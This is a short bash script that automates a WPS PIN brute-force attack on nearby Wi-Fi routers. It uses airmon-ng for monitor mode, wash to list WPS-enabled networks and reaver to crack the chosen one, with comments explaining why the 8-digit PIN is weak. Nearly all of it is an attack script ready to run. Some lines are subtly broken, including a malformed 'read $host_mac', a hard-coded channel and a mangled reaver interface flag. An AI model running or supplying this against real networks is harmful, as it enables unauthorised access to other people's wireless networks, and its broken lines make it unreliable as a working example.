#!/bin/bash

###########################
#           WPS           #
###########################

# Requires wash package

# WPA and WPA2 encryption are improvements over WEP
# Some routers and other devices have WPS buttons that can be exploited
# Instead of having to enter a pass key, WPS generates a 8 digit pin that can be cracked with brute force
# This is a flaw with the router, not WPA itself

# ifidconfig wlan0 down
# iwconfig wlan0 mode monitor

airmon-ng start wlan1

echo "These are access points in your vicinity..."

wash -i wlan1mon --ignore-fcs			# check for access points that have WPS enabled

echo "Which network do you want to try?"
read $host_mac

reaver -b $host_mac -c 11 -i -A wlan1mon
# -b bssid
# -c channel
# -i interface

airmon-ng stop wlan1

# ifconfig wlan0 down
# iwconfig wlan0 mode managed
# ifconfig wlan0 up
